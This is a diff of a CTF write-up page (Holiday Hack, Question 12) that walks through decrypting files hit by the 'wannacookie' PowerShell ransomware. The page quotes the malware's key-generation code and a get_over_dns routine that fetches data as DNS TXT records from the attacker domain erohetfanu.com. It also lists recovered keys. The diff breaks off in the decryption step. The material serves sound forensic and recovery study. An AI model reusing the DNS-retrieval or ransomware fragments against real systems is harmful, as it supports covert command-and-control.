@@ -28,8 +28,8 @@
   <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
     <link rel="index" title="Index" href="../genindex.html" />
     <link rel="search" title="Search" href="../search.html" />
-    <link rel="next" title="Question 13" href="question13.html" />
-    <link rel="prev" title="Question 11" href="question11.html" /> 
+    <link rel="next" title="Question 13: Santa’s Door" href="question13.html" />
+    <link rel="prev" title="Question 11: Stop the Malware" href="question11.html" /> 
 
   
   <script src="../_static/js/modernizr.min.js"></script>
@@ -89,14 +89,23 @@
 <li class="toctree-l1"><a class="reference internal" href="question6.html">Question 6: Badge Manipulation</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question7.html">Question 7: HR Incident Response</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question8.html">Question 8: Network Traffic Forensics</a></li>
-<li class="toctree-l1"><a class="reference internal" href="question9.html">Question 9</a></li>
+<li class="toctree-l1"><a class="reference internal" href="question9.html">Question 9: Catch the Malware</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question10.html">Question 10: Identify the Domain</a></li>
-<li class="toctree-l1"><a class="reference internal" href="question11.html">Question 11</a></li>
+<li class="toctree-l1"><a class="reference internal" href="question11.html">Question 11: Stop the Malware</a></li>
 <li class="toctree-l1 current"><a class="current reference internal" href="#">Question 12: Recover Alabaster’s Password</a><ul>
-<li class="toctree-l2"><a class="reference internal" href="#solution">Solution</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#solution">Solution</a><ul>
+<li class="toctree-l3"><a class="reference internal" href="#step-1-analyse-the-wannacookie-ps1-code">Step 1: Analyse the wannacookie.ps1 code</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#step-2-obtain-the-private-key">Step 2: Obtain the private key</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#step-3-create-a-x509-certificate-containing-public-private-keys">Step 3: Create a X509 certificate containing public/private keys</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#step-4-retrieve-the-encrypted-encryption-key-and-the-hash-of-the-encryption-key">Step 4: Retrieve the encrypted encryption key and the hash of the encryption key</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#step-5-use-the-x509-certifcate-to-decrypt-the-symmetric-encryption-key">Step 5: Use the X509 certifcate to decrypt the symmetric encryption key</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#step-6-decrypt-the-file">Step 6: Decrypt the file</a></li>
+<li class="toctree-l3"><a class="reference internal" href="#step-7-extract-the-vault-password">Step 7: Extract the vault password</a></li>
 </ul>
 </li>
-<li class="toctree-l1"><a class="reference internal" href="question13.html">Question 13</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="question13.html">Question 13: Santa’s Door</a></li>
 <li class="toctree-l1"><a class="reference internal" href="question14.html">Question 14: Who Is Behind It All?</a></li>
 </ul>
 <p class="caption"><span class="caption-text">Terminals:</span></p>
@@ -186,12 +195,484 @@
 <p>Answer: <em>ED#ED#EED#EF#G#F#G#ABA#BA#B</em></p>
 <div class="section" id="solution">
 <h2>Solution<a class="headerlink" href="#solution" title="Permalink to this headline">¶</a></h2>
-<p>Our approach towards this challenge consisted of analysing the wannacookie code (written in PowerShell) and then using this to try to decrypt the password database.</p>
+<div class="section" id="step-1-analyse-the-wannacookie-ps1-code">
+<h3>Step 1: Analyse the wannacookie.ps1 code<a class="headerlink" href="#step-1-analyse-the-wannacookie-ps1-code" title="Permalink to this headline">¶</a></h3>
+<p>The <code class="docutils literal notranslate"><span class="pre">forensic_artifacts.zip</span></code> file, mentioned in the question, contained a memory dump and a file called <code class="docutils literal notranslate"><span class="pre">alabaster_passwords.elfdb.wannacookie</span></code>. We assumed that the file was encrypted by the wannacookie malware that we had been examining. Hence our first step was to examine the code and try to work out how it encrypted files with the hope that we could use this knowledge to decrypt files.</p>
+<p>An analysis of wannacookie.ps1 revealed the following:</p>
+<ol class="arabic simple">
+<li>The <strong>wannacookie.ps1</strong> code had the ability to both encrypt and decrypt files. Upon learning this, the problem became easier because we already had the tools (<strong>wannacookie.ps1</strong>) required to decrypt the files.</li>
+<li>The <strong>enc_dec()</strong> function is called to encrypt/decrypt files. The function is passed three parameters:</li>
+</ol>
+<blockquote>
+<div><ol class="loweralpha simple">
+<li>an encrption/decryption key</li>
+<li>the file name/s</li>
+<li>a boolean flag ($false = decrypt, $true = encrypt)</li>
+</ol>
+</div></blockquote>
+<p><strong>enc_dec()</strong> calls another function (<strong>Enc_Dec-File()</strong>) to perform the encryption/decryption using a symmetric AES algorithm. This meant that the <em>same</em> key was used for both encryption and decryption.</p>
+<ol class="arabic simple" start="3">
+<li>The symmetric encryption key is generated using:</li>
+</ol>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nv">$Byte_key</span> <span class="p">=</span> <span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">Unicode</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">($((</span><span class="no">[char[]]</span><span class="p">(</span><span class="no">[char]01..[char]</span><span class="n">255</span><span class="p">)</span> <span class="p">+</span> <span class="p">(</span><span class="no">[char[]]</span><span class="p">(</span><span class="no">[char]01..[char]</span><span class="n">255</span><span class="p">))</span> <span class="p">+</span> <span class="n">0</span><span class="p">..</span><span class="n">9</span> <span class="p">|</span> <span class="nb">sort </span><span class="p">{</span><span class="nb">Get-Random</span><span class="p">})[</span><span class="n">0</span><span class="p">..</span><span class="n">15</span><span class="p">]</span> <span class="n">-join</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>  <span class="p">|</span> <span class="p">?</span> <span class="p">{</span><span class="nv">$_</span> <span class="o">-ne</span> <span class="n">0x00</span><span class="p">})</span>
+</pre></div>
+</div>
+<p><strong>$Byte_key</strong> creates an array of 16 integers where each integer has a value from 1 to 255. The key also gets stored as <strong>$Hex_key</strong>. <strong>$Hex_key</strong> is a string of 32 characters where each set of two characters is the hexadecimal representation of each integer value in <strong>$Byte_key</strong>. The <strong>B2H()</strong> and <strong>H2B()</strong> functions that are included in <strong>wannacookie.ps1</strong> can be conveniently used to convert between <strong>$Byte_key</strong> and <strong>$Hex_key</strong>.</p>
+<ol class="arabic simple" start="4">
+<li><strong>$Byte_key</strong> gets encrypted using a X509 public key via the <strong>Pub_Key_Enc()</strong> function. The result gets stored in a variable called <strong>$Pub_key_encrypted_Key</strong>. The <strong>$Byte_key</strong> and <strong>$Hex_key</strong> variables are later destroyed. It was later proven that this complicated the decryption process because the symmetric key was no longer in memory (i.e. it was not in the memory dump). We realised that to decrypt the file we would need to find a way to obtain the private key.</li>
+<li><strong>$Pub_key_encrypted_Key</strong> is a string with a length of 512 hexadecimal digits.</li>
+<li>The symmetric key gets hashed using SHA1. The hash has a length of 40 and consists of HEX digits.</li>
+</ol>
+</div>
+<div class="section" id="step-2-obtain-the-private-key">
+<h3>Step 2: Obtain the private key<a class="headerlink" href="#step-2-obtain-the-private-key" title="Permalink to this headline">¶</a></h3>
+<p>Based on <strong>wannacookie.ps1</strong> we created the following code to download the RSA key used to encrypt the symmetric key and import it as a X509 certificate. Line 32 exports the key as a DER encoded file (<strong>kringle.cer</strong>).</p>
+<div class="highlight-powershell notranslate"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="n">get_over_dns</span><span class="p">(</span><span class="nv">$f</span><span class="p">)</span> <span class="p">{</span>
+   <span class="nv">$h</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span>
+   <span class="k">foreach</span> <span class="p">(</span><span class="nv">$i</span> <span class="k">in</span> <span class="n">0</span><span class="p">..(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">($(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span><span class="p">,</span> <span class="n">10</span><span class="p">)-</span><span class="n">1</span><span class="p">))</span> <span class="p">{</span>
+       <span class="nv">$h</span> <span class="p">+=</span> <span class="p">$(</span><span class="nb">Resolve-DnsName</span> <span class="n">-Server</span> <span class="n">erohetfanu</span><span class="p">.</span><span class="n">com</span> <span class="n">-Name</span> <span class="s2">&quot;$i.$f.erohetfanu.com&quot;</span> <span class="n">-Type</span> <span class="n">TXT</span><span class="p">).</span><span class="n">Strings</span>
+   <span class="p">}</span>
+   <span class="k">return</span> <span class="p">(</span><span class="n">H2A</span> <span class="nv">$h</span><span class="p">)</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">A2H</span><span class="p">(){</span>
+   <span class="k">Param</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span>
+   <span class="nv">$c</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span>
+   <span class="nv">$b</span> <span class="p">=</span> <span class="nv">$a</span><span class="p">.</span><span class="n">ToCharArray</span><span class="p">();</span>
+   <span class="k">Foreach</span> <span class="p">(</span><span class="nv">$element</span> <span class="k">in</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
+       <span class="nv">$c</span> <span class="p">=</span> <span class="nv">$c</span> <span class="p">+</span> <span class="s2">&quot; &quot;</span> <span class="p">+</span> <span class="no">[System.String]</span><span class="p">::</span><span class="n">Format</span><span class="p">(</span><span class="s2">&quot;{0:X}&quot;</span><span class="p">,</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToUInt32</span><span class="p">(</span><span class="nv">$element</span><span class="p">))</span>
+   <span class="p">}</span>
+   <span class="k">return</span> <span class="nv">$c</span> <span class="o">-replace</span> <span class="s1">&#39; &#39;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">H2A</span><span class="p">()</span> <span class="p">{</span>
+   <span class="k">Param</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span>
+   <span class="nv">$outa</span>
+   <span class="nv">$a</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>  <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="no">[char]</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">toint16</span><span class="p">(</span><span class="nv">$_</span><span class="p">,</span><span class="n">16</span><span class="p">))}</span> <span class="p">|</span> <span class="k">forEach</span> <span class="p">{</span><span class="nv">$outa</span> <span class="p">=</span> <span class="nv">$outa</span> <span class="p">+</span> <span class="nv">$_</span><span class="p">}</span>
+   <span class="k">return</span> <span class="nv">$outa</span>
+<span class="p">}</span>
+
+<span class="nv">$pub_key</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">($(</span><span class="n">get_over_dns</span><span class="p">(</span><span class="n">A2H</span> <span class="p">(</span><span class="s2">&quot;server.crt&quot;</span><span class="p">))))</span>
+
+<span class="no">[byte[]]</span><span class="nv">$pub_bytes</span> <span class="p">=</span> <span class="nv">$pub_key</span>
+<span class="nv">$cert</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Cryptography</span><span class="p">.</span><span class="n">X509Certificates</span><span class="p">.</span><span class="n">X509Certificate2</span>
+<span class="nv">$cert</span><span class="p">.</span><span class="n">Import</span><span class="p">(</span><span class="nv">$pub_bytes</span><span class="p">)</span>
+
+<span class="nb">Set-Content</span> <span class="n">-Path</span> <span class="s1">&#39;E:\Temp\kringle.cer&#39;</span> <span class="n">-Value</span> <span class="nv">$pub_key</span> <span class="n">-Encoding</span> <span class="n">Byte</span>
+</pre></div>
+</td></tr></table></div>
+<p>We hoped that the certifcate would also contain the private key but examining <strong>$cert.value</strong> revealed that the certificate only contained the public key with no associated the private key.</p>
+<p>Feeling inspired by something we saw in the <strong>app.js</strong> code from <a class="reference internal" href="question8.html"><span class="doc">Question 8</span></a> we substituted <code class="docutils literal notranslate"><span class="pre">server.crt</span></code> in the above code with <code class="docutils literal notranslate"><span class="pre">server.key</span></code>. After working through a few errors we ended up with the following code to obtain the private key. Line 13 exports the private key as a PEM encoded file (<strong>kringleserver.key</strong>).</p>
+<div class="highlight-powershell notranslate"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="n">A2H</span><span class="p">(){</span>
+   <span class="k">Param</span><span class="p">(</span><span class="nv">$a</span><span class="p">)</span>
+   <span class="nv">$c</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span>
+   <span class="nv">$b</span> <span class="p">=</span> <span class="nv">$a</span><span class="p">.</span><span class="n">ToCharArray</span><span class="p">();</span>
+   <span class="k">Foreach</span> <span class="p">(</span><span class="nv">$element</span> <span class="k">in</span> <span class="nv">$b</span><span class="p">)</span> <span class="p">{</span>
+       <span class="nv">$c</span> <span class="p">=</span> <span class="nv">$c</span> <span class="p">+</span> <span class="s2">&quot; &quot;</span> <span class="p">+</span> <span class="no">[System.String]</span><span class="p">::</span><span class="n">Format</span><span class="p">(</span><span class="s2">&quot;{0:X}&quot;</span><span class="p">,</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">ToUInt32</span><span class="p">(</span><span class="nv">$element</span><span class="p">))</span>
+   <span class="p">}</span>
+   <span class="k">return</span> <span class="nv">$c</span> <span class="o">-replace</span> <span class="s1">&#39; &#39;</span>
+<span class="p">}</span>
+
+<span class="nv">$priv_key</span> <span class="p">=</span> <span class="p">$(</span><span class="n">get_over_dns</span><span class="p">(</span><span class="n">A2H</span> <span class="p">(</span><span class="s2">&quot;server.key&quot;</span><span class="p">)))[</span><span class="n">1</span><span class="p">]</span>
+
+<span class="nb">Set-content</span> <span class="s1">&#39;E:\temp\kringleserver.key&#39;</span> <span class="n">-Value</span> <span class="nv">$priv_key</span> <span class="n">-Encoding</span> <span class="n">ASCII</span>
+</pre></div>
+</td></tr></table></div>
+<p><strong>$priv_key</strong> was a string representing the private key in PEM format.</p>
+</div>
+<div class="section" id="step-3-create-a-x509-certificate-containing-public-private-keys">
+<h3>Step 3: Create a X509 certificate containing public/private keys<a class="headerlink" href="#step-3-create-a-x509-certificate-containing-public-private-keys" title="Permalink to this headline">¶</a></h3>
+<p>Instead of trying to work out how to import utilise the private key with the System.Security.Cryptography .NET library, we decided to utilise <strong>OpenSSL</strong>, using the public/private keys that we already had, to create a X509 certifcate containing both private/public keys. Our aim was to later import this certificate using code based on <code class="docutils literal notranslate"><span class="pre">wannacookie.ps1</span></code> and decrypt the symmetric encryption key.</p>
+<p>To convert the public key to PEM format we used the following command:</p>
+<div class="highlight-none notranslate"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
+2</pre></div></td><td class="code"><div class="highlight"><pre><span></span>openssl x509 -inform DER -in E:\temp\kringle.cer -out E:\temp\kringle.pem
+openssl pkcs12 -export -out E:\temp\kringle.pfx -inkey E:\temp\kringleserver.key -in E:\temp\kringle.pem
+</pre></div>
+</td></tr></table></div>
+<p>Line 1 converts the public key from DER (<strong>kringle.cer</strong>) to PEM (<strong>kringle.pem</strong>) format.</p>
+<p>Line 2 combines the private and public keys into a PCKS12 encoded certifcate (<strong>kringle.pfx</strong>).</p>
+</div>
+<div class="section" id="step-4-retrieve-the-encrypted-encryption-key-and-the-hash-of-the-encryption-key">
+<h3>Step 4: Retrieve the encrypted encryption key and the hash of the encryption key<a class="headerlink" href="#step-4-retrieve-the-encrypted-encryption-key-and-the-hash-of-the-encryption-key" title="Permalink to this headline">¶</a></h3>
+<dl class="docutils">
+<dt>Before we can utilise the X509 certificate to decrypt the private key we need to retrieve two things from the memory dump:</dt>
+<dd><ol class="first last arabic simple">
+<li>The encrypted symmetric encryption key</li>
+<li>The hash of the symmetric encryption key</li>
+</ol>
+</dd>
+</dl>
+<p>We decided to use <a class="reference external" href="https://github.com/chrisjd20/power_dump">Power Dump</a> to retrieve the information from the memory dump.</p>
 <div class="admonition note">
 <p class="first admonition-title">Note</p>
-<p class="last">In this challenge we will utilise the wannacookie.ps1 code instead of the wannacookie.min.ps1 code.</p>
+<p class="last"><strong>Power Dump</strong> takes a 64 bit Windows 10 powershell process dump made using procdump and retrieves powershell blocks and variables from memory. Basically its strings on steroids with a little extra logic built-in for finding powershell. Only tested and built out right now for/on Windows 10 64 bit Intel.</p>
 </div>
-<p>The next step is to try and work out what type of file the <code class="docutils literal notranslate"><span class="pre">alabaster_passwords.elfdb</span></code> is. We found the simplest way to work this out was to open the file in a text editor and look at the initial characters. This provides the string <code class="docutils literal notranslate"><span class="pre">SQLite</span> <span class="pre">format</span> <span class="pre">3</span></code>.</p>
+<p>We started Power Dump using the following command:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">py</span> <span class="o">-</span><span class="mi">2</span> <span class="o">.</span>\<span class="n">power_dump</span><span class="o">.</span><span class="n">py</span>
+</pre></div>
+</div>
+<p>We used option 1 to load the dump file (<strong>powershell.exe_181109_104716.dmp</strong>). We used option 2 to process the dump file. We then used option 4 to search for stored PowerShell variables.</p>
+<p>To find the key we used the following filters derived from the information we found in Part 1:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">matches</span> <span class="s2">&quot;^[a-fA-F0-9]+$&quot;</span>
+<span class="nb">len</span> <span class="o">==</span> <span class="mi">512</span>
+</pre></div>
+</div>
+<p>This resulted in one match:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mi">3</span><span class="n">cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971</span>
+</pre></div>
+</div>
+<p>To find the hash we used the following filters derived from the information we found in Part 1:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">matches</span> <span class="s2">&quot;^[a-fA-F0-9]+$&quot;</span>
+<span class="nb">len</span> <span class="o">==</span> <span class="mi">40</span>
+</pre></div>
+</div>
+<p>This resulted in one match:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">b0e59a5e0f00968856f22cff2d6226697535da5b</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="step-5-use-the-x509-certifcate-to-decrypt-the-symmetric-encryption-key">
+<h3>Step 5: Use the X509 certifcate to decrypt the symmetric encryption key<a class="headerlink" href="#step-5-use-the-x509-certifcate-to-decrypt-the-symmetric-encryption-key" title="Permalink to this headline">¶</a></h3>
+<p>We used the following code to decrypt the encrypted symmetric encryption key and generate a SHA1 hash of it:</p>
+<div class="highlight-powershell notranslate"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">function</span> <span class="n">H2B</span> <span class="p">{</span>
+   <span class="k">param</span><span class="p">(</span><span class="nv">$HX</span><span class="p">)</span>
+   <span class="nv">$HX</span> <span class="p">=</span> <span class="nv">$HX</span> <span class="n">-split</span> <span class="s1">&#39;(..)&#39;</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{</span> <span class="nv">$_</span> <span class="p">}</span>
+   <span class="k">ForEach</span> <span class="p">(</span><span class="nv">$value</span> <span class="k">in</span> <span class="nv">$HX</span><span class="p">){</span>
+       <span class="no">[Convert]</span><span class="p">::</span><span class="n">ToInt32</span><span class="p">(</span><span class="nv">$value</span><span class="p">,</span><span class="n">16</span><span class="p">)</span>
+   <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">B2H</span> <span class="p">{</span>
+   <span class="k">param</span><span class="p">(</span><span class="nv">$DEC</span><span class="p">)</span>
+   <span class="nv">$tmp</span> <span class="p">=</span> <span class="s1">&#39;&#39;</span>
+   <span class="k">ForEach</span> <span class="p">(</span><span class="nv">$value</span> <span class="k">in</span> <span class="nv">$DEC</span><span class="p">){</span>
+       <span class="nv">$a</span> <span class="p">=</span> <span class="s2">&quot;{0:x}&quot;</span> <span class="o">-f</span> <span class="no">[Int]</span><span class="nv">$value</span>
+       <span class="k">if</span> <span class="p">(</span><span class="nv">$a</span><span class="p">.</span><span class="n">length</span> <span class="o">-eq</span> <span class="n">1</span><span class="p">){</span>
+           <span class="nv">$tmp</span> <span class="p">+=</span> <span class="s1">&#39;0&#39;</span> <span class="p">+</span> <span class="nv">$a</span>
+       <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+           <span class="nv">$tmp</span> <span class="p">+=</span> <span class="nv">$a</span>
+       <span class="p">}</span>
+   <span class="p">}</span>
+   <span class="k">return</span> <span class="nv">$tmp</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="n">Sha1</span><span class="p">(</span><span class="no">[String]</span> <span class="nv">$String</span><span class="p">)</span> <span class="p">{</span>
+   <span class="nv">$SB</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">StringBuilder</span>
+       <span class="no">[System.Security.Cryptography.HashAlgorithm]</span><span class="p">::</span><span class="n">Create</span><span class="p">(</span><span class="s2">&quot;SHA1&quot;</span><span class="p">).</span><span class="n">ComputeHash</span><span class="p">(</span><span class="no">[System.Text.Encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$String</span><span class="p">))|%{</span>
+       <span class="no">[Void]</span><span class="nv">$SB</span><span class="p">.</span><span class="n">Append</span><span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">ToString</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">))</span>
+   <span class="p">}</span>
+   <span class="nv">$SB</span><span class="p">.</span><span class="n">ToString</span><span class="p">()</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nb">import-pfxbytes</span> <span class="p">{</span>
+   <span class="k">param</span><span class="p">(</span><span class="nv">$pfxBytes</span><span class="p">)</span>
+   <span class="nv">$pfxPass</span> <span class="p">=</span> <span class="s1">&#39;password&#39;</span>
+   <span class="nv">$cert</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Cryptography</span><span class="p">.</span><span class="n">X509Certificates</span><span class="p">.</span><span class="n">X509Certificate2</span>
+   <span class="nv">$cert</span><span class="p">.</span><span class="n">Import</span><span class="p">(</span><span class="no">[byte[]]</span><span class="nv">$pfxBytes</span><span class="p">,</span> <span class="nv">$pfxPass</span><span class="p">,</span><span class="s2">&quot;Exportable,PersistKeySet&quot;</span><span class="p">)</span>
+   <span class="k">return</span> <span class="nv">$cert</span>
+<span class="p">}</span>
+
+<span class="nv">$pfxBytes</span> <span class="p">=</span> <span class="nb">Get-Content</span> <span class="n">-Path</span> <span class="s2">&quot;E:\Temp\kringle.pfx&quot;</span> <span class="n">-encoding</span> <span class="n">Byte</span>
+
+<span class="nv">$cert</span> <span class="p">=</span> <span class="nb">import-pfxbytes</span><span class="p">(</span><span class="nv">$pfxBytes</span><span class="p">)</span>
+
+<span class="nv">$Pub_key_encrypted_Key</span> <span class="p">=</span> <span class="s1">&#39;3cf903522e1a3966805b50e7f7dd51dc7969c73cfb1663a75a56ebf4aa4a1849d1949005437dc44b8464dca05680d531b7a971672d87b24b7a6d672d1d811e6c34f42b2f8d7f2b43aab698b537d2df2f401c2a09fbe24c5833d2c5861139c4b4d3147abb55e671d0cac709d1cfe86860b6417bf019789950d0bf8d83218a56e69309a2bb17dcede7abfffd065ee0491b379be44029ca4321e60407d44e6e381691dae5e551cb2354727ac257d977722188a946c75a295e714b668109d75c00100b94861678ea16f8b79b756e45776d29268af1720bc49995217d814ffd1e4b6edce9ee57976f9ab398f9a8479cf911d7d47681a77152563906a2c29c6d12f971&#39;</span>
+
+<span class="nv">$Byte_pub_key_encrypted_Key</span> <span class="p">=</span> <span class="n">H2B</span><span class="p">(</span><span class="nv">$Pub_key_encrypted_Key</span><span class="p">)</span>
+<span class="nv">$Byte_key</span> <span class="p">=</span> <span class="nv">$cert</span><span class="p">.</span><span class="n">PrivateKey</span><span class="p">.</span><span class="n">Decrypt</span><span class="p">(</span><span class="nv">$Byte_pub_key_encrypted_Key</span><span class="p">,</span> <span class="nv">$true</span><span class="p">)</span>
+<span class="nv">$Hex_key</span> <span class="p">=</span> <span class="p">$(</span><span class="n">B2H</span> <span class="nv">$Byte_key</span><span class="p">)</span>
+
+<span class="nv">$Key_Hash</span> <span class="p">=</span> <span class="p">$(</span><span class="n">Sha1</span> <span class="nv">$Hex_key</span><span class="p">)</span>
+
+<span class="nb">Write-Host</span> <span class="n">The</span> <span class="n">key</span> <span class="n">is</span> <span class="nv">$Hex_key</span>
+<span class="nb">Write-Host</span> <span class="n">The</span> <span class="n">hash</span> <span class="n">of</span> <span class="n">the</span> <span class="n">key</span> <span class="n">is</span> <span class="nv">$Key_Hash</span>
+</pre></div>
+</td></tr></table></div>
+<p>The key in line 43 is the same as the key found in Step 4.</p>
+<p>The code produced the following output:</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>The key is ``fbcfc121915d99cc20a3d3d5d84f8308``
+The hash of the key is ``b0e59a5e0f00968856f22cff2d6226697535da5b``
+</pre></div>
+</div>
+<p>The generated hash matched the hash that we found in Step 4. This assured us that we had obtained the correct key.</p>
+</div>
+<div class="section" id="step-6-decrypt-the-file">
+<h3>Step 6: Decrypt the file<a class="headerlink" href="#step-6-decrypt-the-file" title="Permalink to this headline">¶</a></h3>
+<p>We used the following code to decrypt the file which was stored at <code class="docutils literal notranslate"><span class="pre">E:\temp\alabaster_passwords.elfdb.wannacookie</span></code>.</p>
+<div class="highlight-powershell notranslate"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83
+84
+85
+86
+87</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nv">$functions</span> <span class="p">=</span> <span class="p">{</span>
+   <span class="k">function</span> <span class="n">Enc_Dec</span><span class="o">-File</span><span class="p">(</span><span class="nv">$key</span><span class="p">,</span> <span class="nv">$File</span><span class="p">,</span> <span class="nv">$enc_it</span><span class="p">)</span> <span class="p">{</span>
+       <span class="no">[byte[]]</span><span class="nv">$key</span> <span class="p">=</span> <span class="nv">$key</span>
+       <span class="nv">$Suffix</span> <span class="p">=</span> <span class="s2">&quot;`.wannacookie&quot;</span>
+       <span class="no">[System.Reflection.Assembly]</span><span class="p">::</span><span class="n">LoadWithPartialName</span><span class="p">(</span><span class="s1">&#39;System.Security.Cryptography&#39;</span><span class="p">)</span>
+       <span class="no">[System.Int32]</span><span class="nv">$KeySize</span> <span class="p">=</span> <span class="nv">$key</span><span class="p">.</span><span class="n">Length</span><span class="p">*</span><span class="n">8</span>
+       <span class="nv">$AESP</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="s1">&#39;System.Security.Cryptography.AesManaged&#39;</span>
+       <span class="nv">$AESP</span><span class="p">.</span><span class="n">Mode</span> <span class="p">=</span> <span class="no">[System.Security.Cryptography.CipherMode]</span><span class="p">::</span><span class="n">CBC</span>
+       <span class="nv">$AESP</span><span class="p">.</span><span class="n">BlockSize</span> <span class="p">=</span> <span class="n">128</span>
+       <span class="nv">$AESP</span><span class="p">.</span><span class="n">KeySize</span> <span class="p">=</span> <span class="nv">$KeySize</span>
+       <span class="nv">$AESP</span><span class="p">.</span><span class="n">Key</span> <span class="p">=</span> <span class="nv">$key</span>
+       <span class="nv">$FileSR</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">FileStream</span><span class="p">(</span><span class="nv">$File</span><span class="p">,</span> <span class="no">[System.IO.FileMode]</span><span class="p">::</span><span class="n">Open</span><span class="p">)</span>
